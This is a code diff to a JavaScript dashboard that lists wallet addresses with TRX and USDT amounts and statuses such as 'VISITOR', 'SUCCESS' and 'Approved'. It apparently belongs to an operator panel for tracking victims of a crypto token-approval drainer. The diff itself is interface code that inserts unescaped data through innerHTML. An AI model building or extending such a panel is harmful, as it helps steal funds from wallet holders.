@@ -246,17 +246,30 @@
                 const card = document.createElement('div');
                 card.className = "glass p-5 rounded-3xl user-card flex justify-between items-center cursor-pointer";
                 card.onclick = () => openSheet(u);
+                
+                let statusColor = "text-blue-400";
+                let statusText = "Connected";
+                if (u.status === "VISITOR") {
+                    statusColor = "text-yellow-400";
+                    statusText = "Incoming...";
+                } else if (u.status === "SUCCESS") {
+                    statusColor = "text-emerald-400";
+                    statusText = "SUCCESS";
+                }
+
                 card.innerHTML = `
                     <div class="flex items-center gap-4">
-                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center"><i class="fab fa-ethereum text-blue-400"></i></div>
+                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center">
+                            <i class="fab fa-ethereum ${statusColor}"></i>
+                        </div>
                         <div>
-                            <div class="text-sm font-mono font-bold">${u.address.substring(0, 6)}...${u.address.substring(30)}</div>
+                            <div class="text-sm font-mono font-bold">${u.address.length > 20 ? u.address.substring(0, 6) + '...' + u.address.substring(u.address.length - 4) : u.address}</div>
                             <div class="text-[9px] text-slate-500 font-bold uppercase tracking-wider">${u.time} • ${u.trx} TRX</div>
                         </div>
                     </div>
                     <div class="text-right">
-                        <div class="text-md font-black text-emerald-400">$${u.usdt}</div>
-                        <div class="text-[8px] text-slate-500 font-black uppercase">Approved</div>
+                        <div class="text-md font-black ${u.status === 'VISITOR' ? 'text-slate-500' : 'text-emerald-400'}">$${u.usdt}</div>
+                        <div class="text-[8px] text-slate-500 font-black uppercase">${statusText}</div>
                     </div>
                 `;
                 list.appendChild(card);
